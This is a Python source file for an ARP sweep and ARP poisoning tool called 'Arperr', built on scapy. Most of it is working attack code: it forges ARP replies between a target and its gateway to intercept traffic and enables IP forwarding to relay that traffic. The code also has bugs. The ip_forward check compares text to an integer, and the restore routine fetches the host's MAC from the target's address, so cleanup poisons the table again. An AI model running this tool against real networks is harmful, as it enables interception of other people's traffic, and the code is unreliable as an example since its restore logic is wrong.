#!/usr/bin/env python3
import argparse
from scapy.all import srp, ARP, Ether, send
import time
import sys
import os

if os.geteuid() != 0 :
    print("As we are going to use raw sockets in this tool, you can only run this tool as a superuser. Try using sudo.")
    sys.exit(0)



def arp_scan(dst_ip,dst_timeout):
    ans, unans = srp( Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=dst_ip),
        timeout=dst_timeout,verbose=0
            )
    final_result = []
    for i in range(0,len(ans)):
        client_dict = {"ip" : ans[i][1].psrc, "mac" : ans[i][1].hwsrc}
        final_result.append(client_dict)
    return final_result

def enable_iproute():
    """Enables IP routing on our device"""
    file_path ="/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            #already enabled
            return
        with open(file_path,"w") as f:
            print(1, file=f)


def get_mac(dst_ip,dst_timeout):
    """Returns mac address of single ip"""
    ans, unans = srp( Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=dst_ip),
        timeout=dst_timeout,verbose=0
            )
    if ans:
        return ans[0][1].hwsrc

def spoof_in(target_ip, host_ip,req_timeout,verbose=True):
    """To poison the arp table"""
    target_mac = get_mac(target_ip,req_timeout)

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip,op="is-at")
    #sending the packet
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is at {}".format(target_ip, host_ip, self_mac))


def spoof_out(target_ip, host_ip,req_timeout,verbose=True):
    """Restores the arp table back to orginal"""
    target_mac = get_mac(target_ip,req_timeout)
    host_mac = get_mac(target_ip,req_timeout)
    

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    #sending the 6 true arp packets to restore the arp tables back to original
    send(arp_response, verbose=0, count=6)
    if verbose:
        print("[+] Sent to {} : {} is at {}".format(target_ip, host_ip, host_mac))



def banner():
    print("""
    
     _                                        
    / \     _ __   _ __     ___   _ __   _ __ 
   / _ \   | '__| | '_ \   / _ \ | '__| | '__|
  / ___ \  | |    | |_) | |  __/ | |    | |   
 /_/   \_\ |_|    | .__/   \___| |_|    |_|   
                  |_|                         
    
    Arp Sweep>>>sudo ./Arperr.py -a {10.0.2.0/24}
    Arp Poison attack>>>sudo ./Arperr.py -t {10.0.2.15} -g {10.0.2.1}
    """)


if __name__=="__main__":
    parser = argparse.ArgumentParser(description=banner())
    parser.add_argument("-a", "--arp-sweep", help="Perform a ARP Sweep on a whole network. Mention the network in CIDR notation. EX: -a 10.0.2.0/24",
                        metavar="", dest="arp_sweep")
    parser.add_argument("-t", "--target_ip", help="Target ip address to do arp poison attack",
                        metavar="", dest="target")
    parser.add_argument("-g", "--gateway_ip", help="Gateway ip to do arp posion attack",
                        metavar="", dest="gateway")
    parser.add_argument("-T", "--timeout", help="Timeout between each request, by default it is set to 1 second.", type=int,choices=[0,1,2,3,4],
                        default=1, dest="timeout")

    args = parser.parse_args()

    if args.arp_sweep:
        scan_output = arp_scan(args.arp_sweep,args.timeout)
        print("--------------------------------\nIP Address\tMAC Address\n--------------------------------")
        for i in scan_output:
            print("{}\t{}".format(i["ip"],i["mac"]))
    if args.target and args.gateway:
        #Enable ip forwarding
        enable_iproute()
        try:
            while True:
                spoof_in(args.target, args.gateway, args.timeout)
                spoof_in(args.gateway, args.target, args.timeout)
                time.sleep(1)
        except KeyboardInterrupt:
            print("Keyboard Interrupt,....wait....reverting arp poison attack by sending true arp packets")
            spoof_out(args.target, args.gateway, args.timeout)
            spoof_out(args.gateway, args.target, args.timeout)
            print("Arp Poison attack is stopped")


        
